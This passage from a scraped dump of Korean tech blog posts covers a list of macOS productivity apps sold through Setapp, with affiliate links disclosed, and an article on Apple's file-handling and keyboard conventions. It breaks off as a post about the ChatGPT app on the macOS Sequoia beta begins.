역할` `프롬프트`를 사용하여 역할을 호출하세요. 설명서, 이메일, 메모 또는 입력할 곳이면 어디에서든 이렇게 해보세요.\n\n## #X. 발송 준비 완료\n\n### (월 $5부터 | Setapp에서 이용 가능)\n\n\"왜 #X를 넣었을까요? 이것은 앱이 아닌 내가 사용하는 Gmail 확장 프로그램입니다. 이 기사의 보너스로 생각해주세요.\"\n\n<div class=\"content-ad\"></div>\n\n내가 말했듯이, 나는 9시부터 5시까지는 개발자이고 5시부터 9시까지는 블로거이다. 둘 다 성공을 위해 \"네트워킹\"이 필요하다고.\n\n그것은 이메일로 이루어진다. 그래서 나는 이메일에 대한 응담이 중요하고 적시에 회신하며 적극적으로 후속 조치를 취하는 것이 중요하다.\n\n하지만 여기서 가장 어려운 부분은 → 이미 지친 두뇌를 다시 가동시켜야 하고 정식으로 설득력 있는 이메일/회신을 작성해야 하는 것이다. 특히 PM시간에 긴급 이메일이 온 경우에는 더욱 어렵다.\n\n어쨌든, 그것은 슬픈 옛 이야기야.\n\n<div class=\"content-ad\"></div>\n\n최근에 이 신의 보낸 이메일 확장 프로그램 — Ready to Send — 를 설치하면서 내 삶이 훨씬 쉬워졌어요. 이 확장 프로그램은 내 수신 이메일에 자동으로 초안 답장을 생성해줘요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_3.png)\n\n가장 좋은 점은 최신 이메일뿐만 아니라 전체 대화를 고려한다는 것이에요. 이렇게 하면 더 나은 맥락을 파악할 수 있어요.\n\n또한\n\n| 좋은 점  | 추가 기능 |\n|----------|------------|\n| 전체 대화 고려 | 좋은 맥락 제공 |\n| 자동 초안 | 편리함 제공 |\n\n<div class=\"content-ad\"></div>\n\n- 내 스타일, 비즈니스 및 초안 길이에 맞는 AI 프롬프트로 사용자 정의하세요.\n- 자동으로 회신할 이메일 유형을 선택하세요 (AI 크레딧이 회신하지 않는 뉴스레터에 소비되지 않도록).\n\n# #3. TeaCode\n\n## ($24.99 | Setapp에서 이용 가능)\n\n하루에 8시간 동안 코딩을 합니다. 종종 그것은 지치게 합니다.\n\n<div class=\"content-ad\"></div>\n\n친구야, 내 눈을 돌봐주거나 코딩을 더 쉽게 만들어 주거나 상사를 몰디브로 1년간 휴가 보내게 해주는 거라면, 나는 심지어 $9650을 들이겠어.\n\n그래, 알아. 후자는 불가능해. 그렇지만 그게 가능하려면 부사장의 연봉인 $96,000을 뇌물로 줄 돈이 있어야 해. 하지만 오늘은 그 돈이 없어.\n\n그래서 나는 이렇게 해결책을 찾았어. $25짜리 TeaCode 앱이 참 좋더라. macOS의 텍스트 대체 기능의 코더 버전 같아. (예를 들어 omw이라고 입력하면 On my way!로 변경됨!)\n\n얘기해볼까? 스위프트를 입력할 때 두 때 사용법을 알아봐.\n\n<div class=\"content-ad\"></div>\n\n- 'bar'를 얻으려면\n\n```swift\nprivate func bar() {\n\n}\n```\n\n- 'foo'를 가지고 있을 때\n\n```swift\nguard let foo = foo else {\n    return\n}\n```\n\n<div class=\"content-ad\"></div>\n\n- _\"Hello World\" 메시지를 가져오려면\n\n```js\nNSLocalizedString(\"Hello World\", comment: \"Message\")\n```\n\n- HelloWorld를 vdel로 바꾸려면\n\n```js\nprotocol HelloWorldViewDelegate: class {\n}\n\nclass HelloWorldView: NSView {\n    weak var delegate: HelloWorldViewDelegate?\n\n    override init(frame frameRect: NSRect) {\n        super.init(frame: frameRect)\n    }\n\n    required init?(coder decoder: NSCoder) {\n        super.init(coder: decoder)\n    }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n안녕하세요! 이렇게 보세요? 코드에 HelloWorld가 세 번 등장하는데, 한 번만 입력했어요 — TeaCode 덕분에 시간을 절약하고 있네요.\n\n만약 NikhilVemu 대신에 같은 코드를 사용하고 싶다면 vdel NikhilVemu 라고 입력하면 돼요.\n\n제일 좋은 점,\n\n- TeaCode는 80가지 이상의 기본 텍스트 확장 기능을 제공하며, 원한다면 더 만들 수 있어요.\n- 이 앱은 모든 macOS 네이티브 텍스트 편집기와 함께 작동하며, VS Code나 IntelliJ와 같은 편집기용 플러그인도 제공돼요.\n- ⌘+⇧+공백키를 사용하여 Spotlight와 비슷한 인터페이스에서 어떤 확장기능이든 빠르게 찾을 수 있어요.\n\n<div class=\"content-ad\"></div>\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_4.png)\n\n- 만약 동료가 당신의 확장판을 좋아한다면, 모두 .tcbundle 파일에 담아 선물하세요.\n\n# #4. Core Shell\n\n## (무료 | Pro 버전 $9.99 | Setapp에서 이용 가능)\n\n<div class=\"content-ad\"></div>\n\n우리 사무실 공간에는 3,000대 이상의 PC 및 맥이 있습니다. 모두 SSH로 연결할 수 있어요.\n\nCompTIA A+인증을 받은 제가, 상사가 기술 문제로 달려와서 도움이 필요한 경우에 문제 해결 작업을 맡겨줍니다.\n\n터미널을 사용해서 SSH로 원격 시스템에 연결하여 시스템 로그를 확인해서 무슨 문제가 발생했는지 알아냅니다.\n\n어떤 사람들은 매주 두 번씩이나 자주 오게 됩니다. 이유를 모르지만 자주 문제가 발생하는 것 같아요. 그래도 좋아요 - 그래서 \"안녕하세요-안녕히 가세요 친구\" 몇 명을 사귀었거든요.\n\n<div class=\"content-ad\"></div>\n\n그런 사람들을 위해, 그들의 SSH 세부 정보를 ssh_config 파일에 보관하면 편리할 것 같았어요. 그렇게 하면 매번 설정을 물어보지 않아도 돼요.\n\n제이크의 맥에 접속하기 위해 ssh jakepopeye@192.168.0.100을 타이핑하는 대신, ssh Jake만 치면 되니까 편리하지 않나요?\n\n하지만, 아직 자랑스럽지 않아요. 최근에 시스템 문제가 있는 한 사람이 이것을 보고 웃음을 참지 못했어요.\n\n그는 무제한 SSH 구성을 저장하여 클릭 한 번으로 연결할 수 있는 제3자 터미널인 Core Shell을 사용하는 것을 제안했어요.\n\n<div class=\"content-ad\"></div>\n\n아, 그리고 Core Shell은 터미널과 달리 Safari와 유사한 다운로드/업로드 진행 막대를 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_6.png\" />\n\n# #5. Moment\n\n## ($4.99 | Setapp에서 이용 가능)\n\n정말 그렇죠.\n시간을 추적하기 시작한 이후로 제 삶이 많이 변했어요. 미루고 있는 시간이 줄었답니다. 그리고 저는 어떻게 추적하고 있을까요?\n\n<div class=\"content-ad\"></div>\n\n아무 복잡한 앱이 아니라 Moment라는 작은 앱으로 이를 할 수 있어요.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_7.png)\n\n이 앱을 사용해서 마감일을 지키고, 고객에게 청구할 프로젝트 작업 일수를 세고, 안 좋은 습관 90일 동안 끊는 것을 추적하고 있어요.\n\nMoment를 사용하면, 이렇게 할 수 있어요:\n\n<div class=\"content-ad\"></div>\n\n- 프로젝트 마감일, 생일 또는 결혼 기념일까지 카운트 다운 타이머를 만들어보세요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_8.png)\n\n- 하루, 한 달, 한 해 또는 사용자 정의 기간의 경과 시간을 추적하세요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_9.png)\n\n<div class=\"content-ad\"></div>\n\n- 가족들의 나이를 세어보세요 — 그들과 더 많은 시간을 보내기 위한 격려로요.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_10.png)\n\n그리고 가장 좋은 부분은, 남자바에 카운트다운 또는 카운트업이 표시돼서 늘 동기부여가 되요.\n\n## #6. Noizio\n\n<div class=\"content-ad\"></div>\n\n## ($2.99 | Setapp에서 이용 가능)\n\n지난 주에 친척들이 집에 놀러 왔었어요.\n10살 미만의 다섯 명의 건방진 아이들이 여름 방학 8주를 최대한 즐기기 위해 준비를 해왔죠.\n\n저도 그들과 함께 놀고 싶지만, 23살인 저는 책임과 경력에 대한 생각밖에 할 수 없네요. 그래서 이 기사를 작성하고 있었어요.\n\n아이들은 아직 여기 있어요 — 그들의 크고 시끄러운 목소리가 집 안 곳곳에서 울려 퍼지고 있어요. 사실 방투가 방금 내 키보드에서 피아노를 연주하고 도망쳤어요.\n\n<div class=\"content-ad\"></div>\n\n그 이상한 단어들을 정리해야 하는 껄끄러운 일이 있었어요.\n\n아이들과 함께 있는 걸 좋아하지만, 나의 플로우 상태를 위험에 빠뜨리지 않아야 해요. 그래서 지금은 소음 취소 기능이 있는 AirPods Max를 착용하고 있어요.\n\n아무 소리도 들리지 않는 것은 마치 내 귀에서 공기를 뺏겨가는 것 같았어요 — 불편한 느낌이었죠. 어떤 음악이 필요했지만 집중은 계속해야 했어요.\n\n그래서 Noizio 앱을 설치했어요 — 집중을 돕기 위해 환경음을 재생해 주는 매우 간단한 앱이에요. 가장 좋은 점은 다양한 볼륨의 소리를 섞어 다른 경험을 즐길 수 있다는 거예요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_11.png\" />\n\n친구들과 함께 혼합물을 저장하고 내보낼 수도 있어요.\n\n```js\nNoizio가 제공하는 모든 소리들을 여기에서 확인해보세요:\n| 도시 공원의 새 소리      | 오래된 타자기 소리  |\n| 푸른 고래 소리           | 파리 카페 소리         |\n| 갈색 소음                | 분홍 소음           |\n| 모닥불 소리              | 놀이터 소리          |\n| 도시 거리 소리           | 시냇물 소리          |\n| 시계 소리                | 항해 요트 소리      |\n| 우주의 공허함 소리       | 파도 소리              |\n| 사막 소리               | 선박 모래의 소리      |\n| 농장 소리               | 우주 드론 소리         |\n| 개구리와 귀뚜라미 소리    | 지하철 소리           |\n| 유령 소리                | 여름밤 소리            |\n| 심장 박동 소리          | 맑은 날 소리          |\n| 지하철 소리            | 천둥 번개 소리    |\n| 키보드 타이핑 소리 | 열대 새 소리 |\n| 고양이 굴리는 소리 | 비닐 틈의 소음 |\n| 마법의 종소리 | 흰 소음 |\n| 밤의 부엉이 소리 | 바람종 소리 |\n| 10월의 비 소리 | 겨울 바람 소리 |\nα 알파, β 베타, γ 감마, δ 델타, θ 세타 파동.\n```\n\n# #7. Commander One\n\n<div class=\"content-ad\"></div>\n\n## (무료 | 전문가는 $29.99 | Setapp에서 이용 가능)\n\n내 사촌 Akhil은 업워크에서 프리랜서 비디오 편집자입니다.\n\n지난 해 그는 자신의 열정인 비디오 편집에 전념하기 위해 에이전시에서의 1년 6,000달러의 일자리를 그만 두었어요 (이건 인도에서 좋은 돈이에요).\n\n매일 그는 보통 2~3개의 장편 YouTube 비디오 프로젝트를 받아요. 그의 클라이언트들은 대체로 그에게 30~40개의 기본 클립을 보내고 각 비디오에 10~15개의 스톡 풋리지를 추가해 달라고 해요.\n\n<div class=\"content-ad\"></div>\n\n말 그대로 그는 클라이언트의 입력을 안전하게 보관하고 최상의 품질의 산출물을 적어도 3GB 크기로 다시 보내기 위해 충분한 클라우드 공간이 필요합니다.\n\n지금 그는 100 GB Google One 요금제를 사용 중이에요.\n그리고 빠른 시일 내에 200 GB 요금제로 업그레이드했으면 좋겠어요 - 그가 항상 최고의 성과를 이루길 바라는 마음 뿐이에요.\n\n어제 그가 서로 다른 두 클라우드 드라이브 폴더 사이에서 파일을 신속하게 이동하는 걸 보았어요 - 그는 한 개의 네이티브 앱을 사용했습니다. 저는 놀라웠고, 그 앱 이름을 Commander One이라는 것을 알게 되었죠.\n\n![Commander One](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_12.png)\n\n<div class=\"content-ad\"></div>\n\n그는 그것이 그의 일에 대한 거의 필수적이라고 말했어요.\n내가 물었을 때, 그는 대답했어요, \"그것은 파일을 폴더 간에 편리하게 이동할 수 있도록 해주는 듀얼 패널 파일 관리자 앱이에요. 이것을 통해 저는\n\n- 여러 클라우드와 서버를 연결하고 로컬처럼 작업할 수 있어요.\n- 파일을 원하는 수준으로 압축하고 압축 해제할 수 있어요. 그리고 언팩킹하지 않고 아카이브 내의 파일을 편집할 수도 있어요.\n- 안드로이드 폰이나 카메라의 미디어를 케이블을 통해 연결만 하면 바로 관리할 수 있어요. 추가 소프트웨어가 필요하지 않아요.\n- 파일 작업을 대기열에 넣을 수 있어요.\n\n그리고, 개발자로서 너, 니킬, 아래의 것들을 고려해보실 수도 있을 거에요.\n\n- 더 정확한 결과를 얻기 위해 RegEx를 사용하세요.\n- 어떤 폴더에서든지 빠르게 터미널 창을 열 수 있어요.\"\n\n<div class=\"content-ad\"></div>\n\n# #8. 포크리프트\n\n## ($19.95 | Setapp에서 이용 가능)\n\nCommander One의 UI에 있는 버튼이 너무 많아 당황스러우신가요? 저도 그랬어요.\n\n이렇게 PRO한 맥 앱을 쓰는 것이 익숙하지 않아요.\n\n<div class=\"content-ad\"></div>\n\n제 동생과 달리 간단하게 보이지만 더 강력한 듀얼-패널 파일 관리자인 Forklift를 설치했어요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_13.png)\n\nCommander One처럼 Forklift도 다음과 같은 기능을 제공해요:\n\n- 여러 클라우드 및 서버를 연결하고 파일을 관리할 수 있어요.\n- 전송을 대기열에 추가하고 실시간으로 진행 상황을 확인할 수 있어요.\n- 태그로 파일을 정리할 수 있어요.\n- 같은 패널에 여러 폴더 탭을 만들 수 있어요.\n- 현재 폴더 경로에서 터미널을 열 수 있어요.\n\n<div class=\"content-ad\"></div>\n\n그리고 Forklift로 할 수 있는 것을 Commander One으로는 할 수 없는 것은 다음과 같습니다:\n\n- 소스 간에 폴더/파일을 단방향 또는 양방향으로 동기화합니다.\n- 실수가 발생할 경우 파일 관리 로그를 확인합니다.\n- Forklift 내에서 직접 Dropbox 파일 링크를 생성합니다.\n- 앱을 마지막 조각까지 삭제합니다.\n- 다른 탭/패널 레이아웃을 작업 공간으로 저장하고 필요한 내용을로드합니다.\n- 앱에서 Git 작업을 직접 수행합니다.\n- 두 개의 텍스트 또는 이미지 파일을 비교합니다 (Xcode의 FileMerge, Kaleidoscope, Beyond Compare 또는 Araxis Merge 사용).\n\n그래서 대부분의 사람들에게 Forklift가 더 나은 옵션이라고 말할 수 있습니다.\n\n## #9. Trickster\n\n<div class=\"content-ad\"></div>\n\n## ($29.99 | Setapp에서 이용 가능)\n\n전 학생 출신인데 이제는 개발자이자 블로거이자 가끔 비디오 편집자로 활동하고 있는데, 하루에 수백, 수천 개의 파일을 다루게 되요.\n\n그리고 파레토가 말한 것처럼, 내 시간의 80%는 파일과 앱의 20%에 쏟아지게 돼요.\n\n시간이나 정신 에너지를 아껴주는 모든 것을 좋아해요. Trickster가 바로 거기에 속하는데, 제게 꼭 필요한 생산성 앱이랍니다.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_14.png)\n\n이것은 파일과 앱을 추적하고 빠르게 접근할 수 있는 메뉴 바 앱입니다. 특히 사용 빈도가 높은 20%에 대해서요.\n\n\"파일을 찾을 때 Spotlight를 사용하는 것이 어떻게 되지 않나요?\"라고 물을 수도 있습니다. 그러나 Trickster의 키보드 탐색은 더 편합니다. 어디서나 Trickster를 드러낼 때 ⌃Z를 누르기만 하면 됩니다. 그리고 화살표 키로 파일을 찾아 열 수 있습니다.\n\n가장 좋은 점은, 추가되거나 열거나 수정된 모든 파일을 추적하여 CPU를 과부하시키지 않습니다.\n\n\n<div class=\"content-ad\"></div>\n\n특정 폴더를 모니터링하도록 지정할 수 있어요. 원하면 모니터링을 일시 중지할 수도 있어요.\n\n그리고,\n\n- 화면에 고정하여 쉽게 파일에 액세스할 수 있어요 — 전체 화면에서도 가능해요.\n- 트릭스터에서 파일을 빠르게 미리보기하고 드래그하여 일반적으로 하는 것처럼 파일을 빼내실 수 있어요.\n- 사이드바에서 즐겨찾는 폴더를 쉽게 접근할 수 있어요.\n- 원하는 것만 볼 수 있도록 필터를 사용할 수 있어요.\n\n어플이 저를 가장 도와준 부분을 아시나요?\n내가 실수로 잘못된 파일 창을 닫았을 때, 그리고 방금 다운로드한 파일에 액세스하는 것을 도와줄 때 말이에요.\n\n<div class=\"content-ad\"></div>\n\n# #10. FilePane\n\n## ($6.99 | Setapp에서 이용 가능)\n\nFilePane은 필수적이지는 않지만 한 번 사용하면 필요한 앱입니다.\n\n파일을 끌 때 빠르게 파일 작업을 제공하는 편리한 앱입니다.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_15.png)\n\n단순히 파일(들)을 Yoink와 비슷한 선반에 넣으면 마법이 시작됩니다.\n\n예를 들어 설명해보겠습니다.\n\n이미지를 끌어다 놓는다고 가정해 보면, 다음과 같은 작업이 표시됩니다:\n\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_16.png)\n\n- 자르기, 회전하기, 크기 조정하기, 변환하기, 압축하기\n- 데스크톱 배경으로 설정하기\n- 자유롭게 그리기\n\n비슷하게, 텍스트 파일을 끌어다 놓으면 다음 옵션이 나타납니다: 단어 및 글리프 수 보기 및 PDF로 변환하기.\n\nPDF 파일을 끌어다 놓으면 다음 옵션이 나타납니다: 여러 이미지로 분할하기 및 인쇄하기.\n\n\n<div class=\"content-ad\"></div>\n\n이러한 사항들은 모든 파일 유형에 적용됩니다:\n\n- Finder에서 보기 (단일 파일인 경우에만)\n- 모든 파일이 포함된 새 폴더 생성\n- 이메일, X, Facebook, AirDrop로 공유\n- 좋아하는 대상 폴더로 복사/이동\n- 크기 또는 경로를 클립보드에 복사 (단일 파일인 경우에만)\n- 휴지통에 넣기\n\n자주 사용하는 옵션들을 손쉽게 이용할 수 있다는 것은 항상 생산적인 느낌이 아닌가요?\n\n# #11. 유클리드\n\n<div class=\"content-ad\"></div>\n\n## ($2.99 | Setapp에서 이용 가능)\n\n유클리드는 아마도 학생, 회계사, 수학을 하는 모든 사람들을 위한 최고의 과학 계산기 앱일 거에요.\n\n그 이유는 뭐냐면?\n맥의 계산기가 할 수 있는 모든 일을 하기 때문이죠,\n\n-더 큰 계산을 수용할 수 있도록 매우 큰 화면 공간을 가지고 있어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_17.png\" />\n\n- 클릭하지 않아도 실시간으로 계산 결과를 표시합니다.\n- 평균, 비트 시프트, 사인 등 100가지 이상의 과학 연산을 지원합니다.\n- f(x) = √(2x²+sin(x/2))와 같은 사용자 정의 함수를 만들고 x에 대한 값을 설정하여 결과를 얻을 수 있습니다.\n- Euclid는 많은 Excel 수식을 알고 있습니다. 익숙하다면 시도해보세요.\n- 단위를 변환할 수 있습니다.\n\n\n면적\n길이\n부피\n각도\n--------\n통화\n--------\n질량\n압력\n--------\n가속도\n소요 시간\n주파수\n속도\n--------\n에너지\n전력\n온도\n--------\n전하량\n전류\n전압\n저항\n--------\n농도\n--------\n연료 효율성\n\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_18.png\" />\n\n<div class=\"content-ad\"></div>\n\n- 60개의 이전 결과를 기억하니까 AC를 실수로 누르더라도 걱정할 필요 없어요.\n\n## #12. PocketCAS\n\n### (가격: $29.99 | Setapp에서 사용 가능)\n\n2018년에 입학한 대학 1학년 때 공부한 과목 중 하나인 \"공학용 미적분학\" 강의를 떠올려봐요.\n\n<div class=\"content-ad\"></div>\n\n저희 교수님은 상상할 수 있는 가장 이상한 수학 함수를 주고는 했어요. 그리고 Matlab을 사용해서 그래프를 그리라고 했죠.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_19.png)\n\n우리는 코드를 입력하고 실행한 다음 2D 또는 3D 그래프를 공백 PDF에 복사해서 제출해야 했어요. 그리고 말했듯이 코딩은 힘들죠.\n\n당시에 Mac과 PocketCAS 앱이 있었으면 더 빨리 과제를 끝낼 수 있었을 텐데 하고 후회했어요.\n\n<div class=\"content-ad\"></div>\n\nPocketCAS는 macOS용으로 주장되는 가장 진보된 계산기 앱입니다. 5학년 학생부터 박사 교수까지 모두를 수학에서 도와줄 수 있어요.\n\n여기에 PocketCAS가 할 수 있는 모든 것들이 있어요. 이는:\n\n- 1+1, 2x5, 17÷2 등 모든 간단한 계산을 해결합니다.\n- 선형, 이차, 삼차 및 더 큰 방정식을 해결합니다.\n- 행렬을 위한 역행렬, 곱셈, 행렬식, 고유벡터 및 고유값을 계산할 수 있습니다.\n- 극한, 도함수, 적분 및 테일러 급수를 계산할 수 있습니다.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_20.png)\n\n<div class=\"content-ad\"></div>\n\n- 2D 및 3D 플롯을 생성합니다.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_21.png)\n\n- 사용자 정의 함수를 정의할 수 있도록 해주는 C와 비슷한 스크립팅 언어를 지원합니다.\n\n총평하면, 수학 애호가들을 위한 만능 앱입니다. 이제 더 이상 여러 수학 작업을 위해 여러 앱이나 탭을 사용할 필요가 없습니다.\n\n<div class=\"content-ad\"></div>\n\n## 더 맥오에스니꼬 어플을 찾고 계신다면, 이 글 읽어보세요\n\n## 마지막으로,\n\n새로운 iOS & Mac 어플을 발견하는 것을 좋아하신다면 (저와 같이), Setapp에 가입해보는 것을 고려해보세요. 매달 $9.99에 240개 이상의 멋진 어플을 골라 사용할 수 있습니다. 이 어플들을 개별로 구매할 경우 수백 달러가 들 수 있으니 참고하세요.\n\n- Setapp 여정을 시작하려면 제 제휴 링크를 사용해보세요! (30일간 무료로 이용 가능)\n- Setapp에서 제가 만든 100가지 최고의 macOS 어플 목록을 무료로 받아보세요.\n\n<div class=\"content-ad\"></div>\n\n새 이야기를 발행할 때마다 알림을 받으려면 475명 이상의 사람들을 참여하세요!\n\n이 게시물에는 제휴 링크가 포함되어 있습니다.","ogImage":{"url":"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_0.png"},"coverImage":"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_0.png","tag":["Tech"],"readingTime":16},{"title":"애플의 간결함 역설","description":"","date":"2024-06-19 01:05","slug":"2024-06-19-TheParadoxofAppleSimplicity","content":"\n\n\n![이미지](/assets/img/2024-06-19-TheParadoxofAppleSimplicity_0.png)\n\n일반적으로, Apple의 애플리케이션, 서비스 및 기기는 사용하기 쉬운 것 같지만, 수십 년간의 DOS, Windows 및 ChromeOS 사용 경험 이후 Apple이 몇 가지 간단한 것을 얼마나 어렵게 만들었는지 종종 놀랍습니다. 그러나 Apple이 그런 선택을 한 이유가 있는지, 그리고 이러한 차이가 실제로 개선인지 알아볼 필요가 있습니다.\n\n몇 가지 예를 들어보겠습니다 . . .\n\n## 파일 이동\n\n\n<div class=\"content-ad\"></div>\n\n한 가지 사례는 MacOS에서 파일을 이동하는 경우입니다. 애플 베테란이 매우 잘 알고 있듯이, 다른 운영 체제와 달리 'Finder'에는 파일을 이동시키는 \"잘라내기\" 기능이 없습니다. 대신 파일을 대상 위치로 복사한 다음 원본 파일을 삭제합니다. 왜 그럴까요? 사용자가 파일을 실수로 잘라내고 대상에 붙여넣기를 잊는 것을 막기 위해서일까요? 당신의 추측이 나와 같습니다.\n\n더욱 놀라운 것은 Finder에서 파일을 선택하고 Finder의 편집 메뉴에 액세스하면 \"잘라내기\"와 예상대로의 키보드 단축키가 보인다는 것입니다. 그러나 이것은 파일에는 작동하지 않으며 텍스트만을 잘라내기 위한 것으로 보입니다.\n\n🍎 실제로, 마우스나 트랙패드를 사용하여 파일을 동일한 또는 다른 Finder 창으로 드래그하여 이동할 수 있습니다. 그리고 Apple은 목적지 폴더에서 사용할 키보드 단축키 (Cmd+Option+V)를 가지고 있어 복사한 파일을 붙여넣고 원본 폴더에서 삭제하는 것이 가능합니다.\n\n<div class=\"content-ad\"></div>\n\n이러한 경우에서 이 기능은 파일이 여전히 사용 가능한지를 보증하여 사용자 보호를 위한 차이의 이유로 손을 든다.\n\n## 파일 삭제\n\n대부분의 운영 체제에서 간단한 파일 삭제 작업을 하면 사용자가 파일을 선택하고 키보드의 Delete 키를 눌러 파일을 삭제할 수 있습니다. MacOS에서는 Delete를 눌러도 선택한 파일에 아무런 영향을 주지 않습니다.\n\n🍎 만약 우클릭한다면 삭제 옵션이 없지만, \"휴지통으로 이동\" 옵션이 있어 원하는 작업을 완료할 수 있습니다. 더불어 \"휴지통으로 이동\" 명령에는 Cmd+Delete 빠른 키가 있습니다.\n\n<div class=\"content-ad\"></div>\n\n다시 한 번, Apple은 사용자들을 실수로 파일을 삭제하는 것으로부터 보호하고 더 신중한 작업을 통해 파일을 삭제하도록 강제하기 위해 노력하고 있는 것 같네요.\n\n## 오른쪽 텍스트 삭제\n\n여기에 한 가지 있습니다. 새로운 Apple 사용자들 중 많은 사람들이 어려워하는 것 같아요. Apple 기기에는 하나의 Delete 키만 있습니다. 이 키는 커서 왼쪽의 텍스트를 제거합니다. 다른 OS에서는 이 작업을 위한 Backspace 키와 커서 오른쪽의 문자를 제거하기 위한 별도의 Delete 키가 있습니다.\n\n이 부분은 키보드 공간을 절약하기 위해 한 개의 키를 생략해서 이렇게 작동하는 것으로 보이는데, 그렇다고 간단함이라고 라벨을 붙일 수도 있겠죠.\n\n<div class=\"content-ad\"></div>\n\n🍎 사실, 애플 제품 중 하나에는 예외가 있습니다. 바로 아래 사진에 나와 있는 외부 매직 키보드에 있는 숫자 키패드가 있습니다. 이 키보드에는 실제로 두 개의 키가 있습니다. 한 개는 Backspace를 나타내고, 다른 하나는 Delete를 나타내며, 이는 Windows 및 다른 운영 체제를 흉내냅니다. MacBook을 사용할 때는 몇 가지 키보드 단축키가 있습니다. FN+Delete 또는 CTRL+d를 사용하여 오른쪽으로 글자를 삭제할 수 있습니다.\n\n![이미지](/assets/img/2024-06-19-TheParadoxofAppleSimplicity_2.png)\n\n## 닫기 버튼인가요?\n\n다른 운영 체제와 마찬가지로, Apple은 화면에 열려있는 각 창에 대한 제어를 \"신호등\" 제어를 통해 제공합니다. 그러나 여러 창을 제어할 수 있는 애플리케이션(예: Word나 Pages에서 여러 문서를 열 때)의 경우, 빨간색 닫기 버튼이 다른 운영 체제의 X버튼처럼 애플리케이션을 닫지 않을 수도 있습니다. 모든 문서 창을 닫은 후에도 애플리케이션이 열려 있는 경우가 있습니다.\n\n<div class=\"content-ad\"></div>\n\n![파라독스](/assets/img/2024-06-19-TheParadoxofAppleSimplicity_3.png)\n\n다른 사용자들로부터 읽은 의견을 종합해보면, 언젠가는 대다수의 애플 사용자들을 크게 혼동시킨 것으로 알려져 있어요. 그러나, 저는 실제로 이것이 제 시간을 아낄 수 있는 기능임을 깨달았어요.\n\n예를 하나 들어볼게요. 저는 SnagIt을 사용하여 스크린샷을 캡처하고 주석을 달아요. 편집창에서 작업을 마치고 나면 창을 닫지만, 이 작업은 창만 닫고 앱을 닫지 않아요. 그래서 다음 스크린샷이 필요할 때를 위해 언제든 준비된 상태로 남아 있어요. 만약 창을 닫으면 앱도 같이 종료된다면, 매번 앱을 재시작해야 했을 거예요.\n\n🍎 애플리케이션을 닫는 방법에는 실제로 여러 가지 옵션이 있어요.\n\n<div class=\"content-ad\"></div>\n\n- 애플리케이션의 메인 메뉴에서 종료 명령을 선택하세요.\n- 활성화된 애플리케이션을 종료하려면 Cmd+Q 퀵 키를 사용하세요.\n- 독(Dock)에 있는 애플리케이션 아이콘을 우클릭하고 종료를 선택하세요.\n\n## 패러독스\n\n여기에서 애플 환경의 몇 가지 \"특징\"을 살펴보았습니다. 다른 운영 체제와 너무 다르기 때문에 애플의 실수처럼 보이거나 적어도 잘못된 단계인 것처럼 보입니다. 그러나 좀 더 면밀히 살펴보면, 애플이 이렇게 디자인하는 데에는 간단함이나 사용자 보호를 위한 매우 좋은 이유가 있을 수 있다는 것을 발견할 수 있습니다.\n\n이러한 애플의 딜레마 중 어떤 것이나 다른 것으로 고민한 적이 있나요? 그렇다면, 다른 사람들을 위해 이 게시물의 유용성을 높이기 위해 댓글에 지적해 주시면 매우 감사하겠습니다. 그리고 여기서 무언가가 잘못되었다면 알려주세요.\n\n<div class=\"content-ad\"></div>\n\n언제나 읽어 주셔서 감사합니다. J","ogImage":{"url":"/assets/img/2024-06-19-TheParadoxofAppleSimplicity_0.png"},"coverImage":"/assets/img/2024-06-19-TheParadoxofAppleSimplicity_0.png","tag":["Tech"],"readingTime":4},{"title":"맥OS Sequoia 베타 릴리스 1에서 OpenAI의 원본 ChatGPT 앱을 다시 작동시키는 방법","description":"","date":"2024-06-19 01:04","slug":"2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1","content":"\n\n소개\n\n애플은 WWDC 2024에서 발표한 macOS 15의 최신 베타 버전인 \"Sequoia\"를 개발자 베타로 제공했습니다. 공개 베타 버전은 이번 여름 후반에 나오고, 최종 버전은 2024년 가을에 제공될 예정입니다.\n\nmacOS 15 Sequoia의 새로운 기능\n\nmacOS 15 Sequoia는 여러 가지 새로운 기능과 개선 사항을 소개했습니다.\n\n<div class=\"content-ad\"></div>\n\n- 아이폰 미러링: 사용자가 맥을 통해 아이폰을 미러링하고 상호작용할 수 있게 해주며 